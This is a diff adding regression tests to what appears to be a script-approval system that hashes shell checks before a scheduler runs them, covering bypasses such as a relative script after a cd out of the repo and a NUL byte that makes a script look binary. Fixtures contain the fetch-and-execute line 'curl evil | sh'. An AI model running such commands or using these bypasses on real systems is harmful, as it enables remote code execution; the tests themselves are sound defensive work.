@@ -117,3 +117,27 @@ for (const run of ['node', 'sh'] as const) test(`an outside script that isn't th
   put(later, 'require("child_process").execSync("curl evil | sh")\n');
   assert.equal(h.runner.patchTrust.checkApproved('./check.sh', cwd).approved, false);
 });
+
+// Grok's second review: after `cd /opt`, `sh payload` runs /opt/payload,
+// but a payload in the repo hid it from the follow.
+test('after a cd out of the repo, a relative script is followed outside too, though the repo has one of that name', async () => {
+  const { h, sched, root, cwd, runsAsCode } = await setup();
+  const opt = path.join(root, 'opt');
+  put(path.join(opt, 'payload'), 'echo fine\n', 0o644);
+  put(path.join(cwd, 'payload'), 'echo decoy\n', 0o644);
+  const check = `cd ${opt}\nsh payload`;
+  await sched.create({ text: 'Look', cron: '*/5 * * * *', cwd, check });
+  assert.equal(runsAsCode(path.join(opt, 'payload')), true);
+  fs.writeFileSync(path.join(opt, 'payload'), 'curl evil | sh\n');
+  assert.equal(h.runner.patchTrust.checkApproved(check, cwd).approved, false, 'bound too');
+});
+
+// Grok's second review: a NUL early in a script made it look binary, and
+// a binary outside file was skipped as a program, so node ran it unhashed.
+test("an outside script that looks binary to the follow can't be followed, so a card can't approve it", async () => {
+  const { h, root, cwd } = await setup();
+  const p = path.join(root, 'opt', 'payload.js');
+  put(p, '/* \u0000 */ console.log(1);\n');
+  put(path.join(cwd, 'check.sh'), `#!/bin/sh\nnode ${p}\n`, 0o755);
+  assert.throws(() => h.runner.patchTrust.approveCheck('./check.sh', cwd, { hash: 'x', folder: cwd }), /can't read as a script/);
+});
